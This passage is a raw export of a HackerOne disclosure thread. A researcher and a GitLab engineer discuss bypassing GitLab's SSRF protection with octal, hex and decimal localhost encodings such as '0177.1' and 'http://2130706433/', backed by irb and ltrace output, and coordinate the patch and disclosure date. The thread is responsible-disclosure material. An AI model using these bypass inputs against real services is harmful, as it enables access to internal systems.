target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/jtdowney/private_address_check\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_from_2017-10-19_18-07-53.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/230/832/dd4e05b85851f50718f8e894cd04f59889c6740d/Screenshot_from_2017-10-19_18-07-53.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2017-10-19_18-07-53.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2017-10-19_18-07-53.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026amp;X-Amz-Signature=8bb559fa463f8438729da90bb7ff2e786e3c2a670c80a0192743c5b1264821ef\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/230/832/dd4e05b85851f50718f8e894cd04f59889c6740d/Screenshot_from_2017-10-19_18-07-53.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2017-10-19_18-07-53.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2017-10-19_18-07-53.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026amp;X-Amz-Signature=8bb559fa463f8438729da90bb7ff2e786e3c2a670c80a0192743c5b1264821ef\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-19T16:08:39.582Z","updated_at":"2017-10-19T16:08:39.582Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":230832,"filename":"Screenshot_from_2017-10-19_18-07-53.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/230/832/dd4e05b85851f50718f8e894cd04f59889c6740d/Screenshot_from_2017-10-19_18-07-53.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2017-10-19_18-07-53.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2017-10-19_18-07-53.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045811Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026X-Amz-Signature=8bb559fa463f8438729da90bb7ff2e786e3c2a670c80a0192743c5b1264821ef"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2087666,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@edio,\n\nThanks for the heads-up. In this case that library wouldn't help. The issue is that these alternative representations of IPs may not resolve at all depending on the host and DNS settings. In cases where that happens our SSRF protection code defaults to allowing the connection attempt and the underlying OS makes the conversion itself.\n\nWe can't simply block all non-resolving hostnames as any project saved when DNS was down would fail. \n\nThe fix we're working on merging requires a hostname to resolve before a connection is made, but not when saving a project. We'll try to get that merged before your deadline. I'll get back in touch soon!","markdown_message":"\u003cp\u003e\u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for the heads-up. In this case that library wouldn\u0026#39;t help. The issue is that these alternative representations of IPs may not resolve at all depending on the host and DNS settings. In cases where that happens our SSRF protection code defaults to allowing the connection attempt and the underlying OS makes the conversion itself.\u003c/p\u003e\n\n\u003cp\u003eWe can\u0026#39;t simply block all non-resolving hostnames as any project saved when DNS was down would fail. \u003c/p\u003e\n\n\u003cp\u003eThe fix we\u0026#39;re working on merging requires a hostname to resolve before a connection is made, but not when saving a project. We\u0026#39;ll try to get that merged before your deadline. I\u0026#39;ll get back in touch soon!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-20T11:32:13.733Z","updated_at":"2017-10-20T11:32:13.733Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2124005,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @briann,\n\nJust to double-check, as stated above the deadline for public disclosure is tomorrow (**Friday, 3 November 2017**) and I wanted to know if you believe you will be able to provide a patch by then. Otherwise, I will have to warn people first today so that they can prepare for the actual write-up tomorrow.\n\nOn top of that, just to make sure you understand everything, this deadline only applies to this report and **not** all my other old reports.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/briann\"\u003e@briann\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eJust to double-check, as stated above the deadline for public disclosure is tomorrow (\u003cstrong\u003eFriday, 3 November 2017\u003c/strong\u003e) and I wanted to know if you believe you will be able to provide a patch by then. Otherwise, I will have to warn people first today so that they can prepare for the actual write-up tomorrow.\u003c/p\u003e\n\n\u003cp\u003eOn top of that, just to make sure you understand everything, this deadline only applies to this report and \u003cstrong\u003enot\u003c/strong\u003e all my other old reports.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T09:27:11.797Z","updated_at":"2017-11-02T09:27:11.797Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2125411,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @edio,\n\nIt looks like I made a mistake and got the date wrong. I've been telling our development and release teams that it was going public on the 15th. We do have the patches ready and merged. We're just waiting on a couple of other patches that we'd like to get included in the release as well. I'll let everyone know and see if there's a chance the release can happen before tomorrow, but it is unlikely (we have a normal release going out today). If you're unable to delay until next week we completely understand. ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eIt looks like I made a mistake and got the date wrong. I\u0026#39;ve been telling our development and release teams that it was going public on the 15th. We do have the patches ready and merged. We\u0026#39;re just waiting on a couple of other patches that we\u0026#39;d like to get included in the release as well. I\u0026#39;ll let everyone know and see if there\u0026#39;s a chance the release can happen before tomorrow, but it is unlikely (we have a normal release going out today). If you\u0026#39;re unable to delay until next week we completely understand. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T15:22:19.607Z","updated_at":"2017-11-02T15:22:19.607Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2125419,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @briann,\n\nBecause of your transparency and the fact that you constantly kept me up to date, I will delay the public disclosure of this report until next week (**Friday, 10 November 2017**). Would that work for you?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/briann\"\u003e@briann\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eBecause of your transparency and the fact that you constantly kept me up to date, I will delay the public disclosure of this report until next week (\u003cstrong\u003eFriday, 10 November 2017\u003c/strong\u003e). Would that work for you?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T15:26:24.063Z","updated_at":"2017-11-02T15:26:24.063Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2125426,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, that would be great. I know I really appreciate it since this was my screw-up. We don't perform security releases on weekends so if it doesn't go out tomorrow it will likely be Monday or Tuesday. Thanks for understanding.","markdown_message":"\u003cp\u003eYes, that would be great. I know I really appreciate it since this was my screw-up. We don\u0026#39;t perform security releases on weekends so if it doesn\u0026#39;t go out tomorrow it will likely be Monday or Tuesday. Thanks for understanding.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T15:29:18.079Z","updated_at":"2017-11-02T15:29:18.079Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2125454,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I publicly announced the delay: https://twitter.com/EdOverflow/status/926109833719369729.\n\nWould it be possible to show me where GitLab forwards on the IP address to the operating system? I figured out that Ruby's Resolv is unable to process the IPs provided above, but I am unable to locate where the actual forwarding takes place.\n\n```\nirb(main):001:0\u003e require \"resolv\"\n=\u003e true\nirb(main):002:0\u003e Resolv.getaddress \"127.0.0.1\"\n=\u003e \"127.0.0.1\"\nirb(main):003:0\u003e Resolv.getaddress \"0177.1\"\nResolv::ResolvError: no address for 0177.1\n\tfrom /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress'\n\tfrom /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress'\n\tfrom (irb):3\n\tfrom /usr/bin/irb:11:in `\u003cmain\u003e'\nirb(main):004:0\u003e Resolv.getaddress \"0x7f.1\"\nResolv::ResolvError: no address for 0x7f.1\n\tfrom /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress'\n\tfrom /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress'\n\tfrom (irb):4\n\tfrom /usr/bin/irb:11:in `\u003cmain\u003e'\n```","markdown_message":"\u003cp\u003eI publicly announced the delay: \u003ca title=\"https://twitter.com/EdOverflow/status/926109833719369729\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FEdOverflow%2Fstatus%2F926109833719369729\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/EdOverflow/status/926109833719369729\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eWould it be possible to show me where GitLab forwards on the IP address to the operating system? I figured out that Ruby\u0026#39;s Resolv is unable to process the IPs provided above, but I am unable to locate where the actual forwarding takes place.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):001:0\u0026gt; require \u0026quot;resolv\u0026quot;\n=\u0026gt; true\nirb(main):002:0\u0026gt; Resolv.getaddress \u0026quot;127.0.0.1\u0026quot;\n=\u0026gt; \u0026quot;127.0.0.1\u0026quot;\nirb(main):003:0\u0026gt; Resolv.getaddress \u0026quot;0177.1\u0026quot;\nResolv::ResolvError: no address for 0177.1\n    from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress\u0026#39;\n    from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress\u0026#39;\n    from (irb):3\n    from /usr/bin/irb:11:in `\u0026lt;main\u0026gt;\u0026#39;\nirb(main):004:0\u0026gt; Resolv.getaddress \u0026quot;0x7f.1\u0026quot;\nResolv::ResolvError: no address for 0x7f.1\n    from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress\u0026#39;\n    from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress\u0026#39;\n    from (irb):4\n    from /usr/bin/irb:11:in `\u0026lt;main\u0026gt;\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-11-02T15:34:59.938Z","updated_at":"2017-11-02T15:34:59.938Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2129141,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The problem stems from the Ruby Resolver library not 100% matching what will be resolved by the OS. You probably remember when you first reported this that initially I was unable to duplicate your findings. In a Rails console the \"0177.1\" string was resolving properly to \"127.0.0.1\" on both my test instances and on GitLab.com. But at some point later that day they stopped resolving at all. It could be a caching issue or an issue in the Resolver library itself, but I was unable to determine the reason why it would sometimes resolve and sometimes not. It could even depend on the configuration of whatever DNS server responds to the query.\n\nIn any case, at least for Debian/Ubuntu, the OS always seems to translate these values to 127.0.0.1 when a connection is opened... without using a DNS lookup. Since we have no easy way to determine for sure what strings every OS will translate automatically it's safer to simply deny connections to hosts without DNS entries altogether. ","markdown_message":"\u003cp\u003eThe problem stems from the Ruby Resolver library not 100% matching what will be resolved by the OS. You probably remember when you first reported this that initially I was unable to duplicate your findings. In a Rails console the \u0026quot;0177.1\u0026quot; string was resolving properly to \u0026quot;127.0.0.1\u0026quot; on both my test instances and on GitLab.com. But at some point later that day they stopped resolving at all. It could be a caching issue or an issue in the Resolver library itself, but I was unable to determine the reason why it would sometimes resolve and sometimes not. It could even depend on the configuration of whatever DNS server responds to the query.\u003c/p\u003e\n\n\u003cp\u003eIn any case, at least for Debian/Ubuntu, the OS always seems to translate these values to 127.0.0.1 when a connection is opened... without using a DNS lookup. Since we have no easy way to determine for sure what strings every OS will translate automatically it\u0026#39;s safer to simply deny connections to hosts without DNS entries altogether. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T19:31:27.218Z","updated_at":"2017-11-02T19:31:27.218Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2129325,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That makes sense. I am currently running a GitLab CE instance on Ubuntu and I can see that the OS can resolve the address by using `inet_aton()`, but Ruby's Resolv fails to resolve it.\n\n```\n$ ltrace ping 0x7f.1 2\u003e\u00261 | grep 0x7f.1\ninet_aton(\"0x7f.1\", { 0x100007f })               = 1\n```\n\nBy the way, I found another bypass using `http://2130706433/`:\n\n```\nirb(main):001:0\u003e require 'resolv'\n=\u003e true\nirb(main):002:0\u003e Resolv.getaddress \"2130706433\"\nResolv::ResolvError: no address for 2130706433\n    from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress'\n    from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress'\n    from (irb):2\n    from /usr/bin/irb:11:in `\u003cmain\u003e'\n```\n```\n$ ltrace ping 2130706433 2\u003e\u00261 | grep 2130706433\ninet_aton(\"2130706433\", { 0x100007f })           = 1\n```\n\n{F235808}\n\nI am currently investigating another potential bypass by playing around with DNS TOCTOU.","markdown_message":"\u003cp\u003eThat makes sense. I am currently running a GitLab CE instance on Ubuntu and I can see that the OS can resolve the address by using \u003ccode\u003einet_aton()\u003c/code\u003e, but Ruby\u0026#39;s Resolv fails to resolve it.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ltrace ping 0x7f.1 2\u0026gt;\u0026amp;1 | grep 0x7f.1\ninet_aton(\u0026quot;0x7f.1\u0026quot;, { 0x100007f })               = 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBy the way, I found another bypass using \u003ccode\u003ehttp://2130706433/\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):001:0\u0026gt; require \u0026#39;resolv\u0026#39;\n=\u0026gt; true\nirb(main):002:0\u0026gt; Resolv.getaddress \u0026quot;2130706433\u0026quot;\nResolv::ResolvError: no address for 2130706433\n    from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress\u0026#39;\n    from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress\u0026#39;\n    from (irb):2\n    from /usr/bin/irb:11:in `\u0026lt;main\u0026gt;\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ltrace ping 2130706433 2\u0026gt;\u0026amp;1 | grep 2130706433\ninet_aton(\u0026quot;2130706433\u0026quot;, { 0x100007f })           = 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"new_bypass.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/235/808/795498bfda3437279ccc7295184cab818c86a72b/new_bypass.png?response-content-disposition=attachment%3B%20filename%3D%22new_bypass.png%22%3B%20filename%2A%3DUTF-8%27%27new_bypass.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026amp;X-Amz-Signature=8792f8c136dad929475253d662325f8c29b81b48ba69961bf5e37b40c62cee9c\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/235/808/795498bfda3437279ccc7295184cab818c86a72b/new_bypass.png?response-content-disposition=attachment%3B%20filename%3D%22new_bypass.png%22%3B%20filename%2A%3DUTF-8%27%27new_bypass.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV